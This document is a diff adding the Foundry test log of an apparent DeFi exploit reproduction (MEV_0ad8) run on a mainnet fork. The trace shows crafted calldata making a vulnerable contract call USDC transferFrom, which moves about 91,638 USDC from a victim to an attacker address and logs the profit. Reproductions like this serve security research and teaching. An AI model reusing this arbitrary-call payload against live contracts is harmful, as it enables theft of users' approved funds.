@@ -1,0 +1,46 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MEV_0ad8_exp.sol:Exploit
+[PASS] testHack() (gas: 79325)
+Logs:
+  Attacker's profit: 91639 USDC
+
+Traces:
+  [84125] Exploit::testHack()
+    ├─ [0] VM::createSelectFork("mainnet", 15926096 [1.592e7])
+    │   └─ ← [Return] 0
+    ├─ [9815] FiatTokenProxy::fallback(0x211B6a1137BF539B2750e02b9E525CF5757A35aE) [staticcall]
+    │   ├─ [2529] FiatTokenV2_1::balanceOf(0x211B6a1137BF539B2750e02b9E525CF5757A35aE) [delegatecall]
+    │   │   └─ ← [Return] 91638112249 [9.163e10]
+    │   └─ ← [Return] 91638112249 [9.163e10]
+    ├─ [56950] 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4::090f88ca(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000211b6a1137bf539b2750e02b9e525cf5757a35ae000000000000000000000000ae39a6c2379bef53334ea968f4c711c8cf3898b600000000000000000000000000000000000000000000000000000015560e9ff900000000000000000000000000000000000000000000000000000000)
+    │   ├─ [10148] WETH9::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0)
+    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [26392] FiatTokenProxy::fallback(0x211B6a1137BF539B2750e02b9E525CF5757A35aE, 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, 91638112249 [9.163e10])
+    │   │   ├─ [25597] FiatTokenV2_1::transferFrom(0x211B6a1137BF539B2750e02b9E525CF5757A35aE, 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, 91638112249 [9.163e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x211B6a1137BF539B2750e02b9E525CF5757A35aE, to: 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, value: 91638112249 [9.163e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb08ef94e40cf46a3b9c30f538fc53bd116e78b004768851a17c9f76414f95985: 0x00000000000000000000000000000000000000000000000000000000000f4240 → 0x00000000000000000000000000000000000000000000000000000015561de239
+    │   │   │   │   @ 0xb8086c5729ff726a2764bb2bcae0d5f5a799c30d0142f48d148b478155abdd9a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffeaa9f16006
+    │   │   │   │   @ 0xc1d1984df05e01f3f0d9cf96cecef56ff20b848f620a3b4cba39ede018e56948: 0x00000000000000000000000000000000000000000000000000000015560e9ff9 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [8148] WETH9::transferFrom(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, 0)
+    │   │   ├─ emit Transfer(from: FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], to: 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [4520] WETH9::approve(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   ├─ emit Approval(owner: 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, spender: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [1315] FiatTokenProxy::fallback(0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6) [staticcall]
+    │   ├─ [529] FiatTokenV2_1::balanceOf(0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6) [delegatecall]
+    │   │   └─ ← [Return] 91639112249 [9.163e10]
+    │   └─ ← [Return] 91639112249 [9.163e10]
+    ├─ [0] console::log("Attacker's profit: %s USDC", 91639 [9.163e4]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.52s (5.52s CPU time)
+
+Ran 1 test suite in 6.74s (5.52s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
